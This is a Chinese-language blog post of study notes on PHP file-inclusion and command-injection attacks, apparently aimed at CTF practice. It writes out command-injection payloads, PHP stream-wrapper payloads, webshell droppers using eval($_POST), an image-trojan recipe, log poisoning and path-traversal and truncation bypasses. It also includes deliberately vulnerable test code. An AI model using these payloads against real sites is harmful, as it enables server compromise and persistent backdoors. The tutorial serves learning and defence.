<!DOCTYPE html>


  <html class="dark page-post">


<head>
  <meta charset="utf-8">
  
  <title>文件包含 | pz1o</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="web," />
  

  <meta name="description" content="今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。 文件包含0x01定义在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。 0x02环境要求 allow_url_fopen&#x3D;On(默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include&#x3D;On(php5.2之后默认为O">
<meta property="og:type" content="article">
<meta property="og:title" content="文件包含">
<meta property="og:url" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
<meta property="og:site_name" content="pz1o">
<meta property="og:description" content="今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。 文件包含0x01定义在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。 0x02环境要求 allow_url_fopen&#x3D;On(默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include&#x3D;On(php5.2之后默认为O">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png">
<meta property="og:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png">
<meta property="article:published_time" content="2020-12-09T15:21:27.000Z">
<meta property="article:modified_time" content="2021-03-03T07:27:42.691Z">
<meta property="article:author" content="pz1o">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">


  
    
<link rel="stylesheet" href="/css/personal-style.css">

  

  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-38189205-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">MAP</span>
  

  <div class="post-header LEFT">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">MAP</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            Blog
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            Tag
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            About
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">Posts List</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01定义"><span class="toc-text">0x01定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02环境要求"><span class="toc-text">0x02环境要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03文件包含函数"><span class="toc-text">0x03文件包含函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04命令执行"><span class="toc-text">0x04命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#定义"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用连接符"><span class="toc-text">常用连接符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见命令执行函数"><span class="toc-text">常见命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05php伪协议"><span class="toc-text">0x05php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-和phar"><span class="toc-text">data:&#x2F;&#x2F;和phar:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06包含Apache日志文件"><span class="toc-text">0x06包含Apache日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07包含SESSION"><span class="toc-text">0x07包含SESSION</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08包含临时文件"><span class="toc-text">0x08包含临时文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09包含上传文件"><span class="toc-text">0x09包含上传文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过方法"><span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10指定前缀绕过"><span class="toc-text">0x10指定前缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#目录遍历"><span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-text">编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11指定后缀绕过"><span class="toc-text">0x11指定后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用url"><span class="toc-text">利用url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用协议"><span class="toc-text">利用协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长度截断"><span class="toc-text">长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12通过phpinfo去Getshell"><span class="toc-text">0x12通过phpinfo去Getshell</span></a></li></ol></li></ol>
  </div>



<div class="content content-post LEFT">
   <article id="post-文件包含" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">文件包含</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2020.12.09</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>pz1o</span>
        </span>
      

      
  <span class="article-category">
    <i class="icon-list"></i>
    <a class="article-category-link" href="/categories/web/">web</a>
  </span>



      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <p>今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="0x01定义"><a href="#0x01定义" class="headerlink" title="0x01定义"></a>0x01定义</h2><p>在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。</p>
<h2 id="0x02环境要求"><a href="#0x02环境要求" class="headerlink" title="0x02环境要求"></a>0x02环境要求</h2><ul>
<li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li>
<li>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</li>
</ul>
<h2 id="0x03文件包含函数"><a href="#0x03文件包含函数" class="headerlink" title="0x03文件包含函数"></a>0x03文件包含函数</h2><ul>
<li>include():可获得指定文件中的所有文本，并把文本拷贝到使用 include 函数的文件中。include() 函数<strong>会生成一个警告，但是脚本会继续执行。</strong></li>
<li>require():函数接受的所有文本文件,并将它复制到指定的文件中，使用了包括功能。如果在加载一个文件时有任何问题，<strong>生成一个致命错误,停止脚本的执行。</strong></li>
</ul>
<h2 id="0x04命令执行"><a href="#0x04命令执行" class="headerlink" title="0x04命令执行"></a>0x04命令执行</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、</p>
<p>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令</p>
<p>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li><p>应用调用执行系统命令的函数</p>
</li>
<li><p>将用户输入作为系统命令的参数拼接到了命令行中</p>
</li>
<li><p>没有对用户输入进行过滤或过滤不严</p>
</li>
</ul>
<hr>
<h3 id="常用连接符"><a href="#常用连接符" class="headerlink" title="常用连接符"></a>常用连接符</h3><ul>
<li>在Windows和Linux中我们可以使用<strong>&amp;来执行多条命令。</strong></li>
<li><strong>|</strong>：前面命令输出结果作为后面命令的输入内容；输入8.8.8.8|whoami </li>
<li><strong>||</strong>：前面命令执行失败的时候才执行后面的命令</li>
<li><strong>&amp;&amp;</strong>：前面命令执行成功了才执行后面的命令</li>
<li>在Linux中还可以用；号来连接。</li>
</ul>
<h3 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h3><ul>
<li><p>system：成功执行返回结果的最后一行，否则返回FALSE</p>
</li>
<li><p>exec：成功执行返回结果的最后一行</p>
</li>
<li><p>shell_exec：成功执行返回全部结果，否则返回NULL</p>
</li>
<li><p>passthru ：把命令的运行结果原样地直接输出到标准输出设备上</p>
</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>读取指定目录内容</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure>
<p><strong>读取指定文件内容</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0x05php伪协议"><a href="#0x05php伪协议" class="headerlink" title="0x05php伪协议"></a>0x05php伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</strong>当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p>
<p>在ctf中，php://input用于执行php代码。</p>
<p>通常会有两种类型：</p>
<ol>
<li>任意代码执行</li>
<li>文件内容绕过</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</span><br><span class="line"></span><br><span class="line">由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</span><br></pre></td></tr></table></figure>
<h3 id="data-和phar"><a href="#data-和phar" class="headerlink" title="data://和phar://"></a>data://和phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p>
<h2 id="0x06包含Apache日志文件"><a href="#0x06包含Apache日志文件" class="headerlink" title="0x06包含Apache日志文件"></a>0x06包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p>
<p>利用条件：</p>
<ul>
<li>对日志文件可读</li>
<li>知道日志文件的存储目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。</span><br><span class="line">  如果访问一个不存在的资源时，如http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt; 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</span><br></pre></td></tr></table></figure>
<h2 id="0x07包含SESSION"><a href="#0x07包含SESSION" class="headerlink" title="0x07包含SESSION"></a>0x07包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p>利用条件：</p>
<ol>
<li>找到SESSION内的可控变量</li>
<li>SESSION文件可读写，并且知道存储路径</li>
</ol>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<h2 id="0x08包含临时文件"><a href="#0x08包含临时文件" class="headerlink" title="0x08包含临时文件"></a>0x08包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<h2 id="0x09包含上传文件"><a href="#0x09包含上传文件" class="headerlink" title="0x09包含上传文件"></a>0x09包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">图片马的制作方式如下，在cmd控制台下输入：</span><br><span class="line"></span><br><span class="line">进入1.jpg和2.php的文件目录后，执行：</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">图片代码如下：</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">然后访问URL：http:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</span><br></pre></td></tr></table></figure>
<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="0x10指定前缀绕过"><a href="#0x10指定前缀绕过" class="headerlink" title="0x10指定前缀绕过"></a>0x10指定前缀绕过</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>使用../../返回上一目录，称为目录遍历</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol>
<li><p>url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure>
</li>
<li><p>二次编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure>
</li>
<li><p>容器/服务器编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x11指定后缀绕过"><a href="#0x11指定后缀绕过" class="headerlink" title="0x11指定后缀绕过"></a>0x11指定后缀绕过</h2><p>后缀测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="利用url"><a href="#利用url" class="headerlink" title="利用url"></a>利用url</h3><p>完整url格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>
<p><strong>query(?)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure>
<p><strong>fragment(#)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure>
<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p><strong>zip://</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo.txt</span><br></pre></td></tr></table></figure>
<p><strong>phar://</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong></p>
<ul>
<li>php版本 &lt; php 5.2.8</li>
</ul>
<p><strong>原理：</strong></p>
<ul>
<li>Windows下目录最大长度为256字节，超出的部分会被丢弃</li>
<li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</li>
</ul>
<p><strong>利用方法：</strong></p>
<ul>
<li><p>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;。。。省略。。。.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p><strong>利用条件：</strong></p>
<ul>
<li>magic_quotes_gpc = Off</li>
<li>php版本 &lt; php 5.3.4</li>
</ul>
<p><strong>利用方法：</strong></p>
<ul>
<li><p>直接在文件名的最后加上%00来截断指定的后缀名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：现在用到%00阶段的情况已经不多了</p>
<h2 id="0x12通过phpinfo去Getshell"><a href="#0x12通过phpinfo去Getshell" class="headerlink" title="0x12通过phpinfo去Getshell"></a>0x12通过phpinfo去Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p>
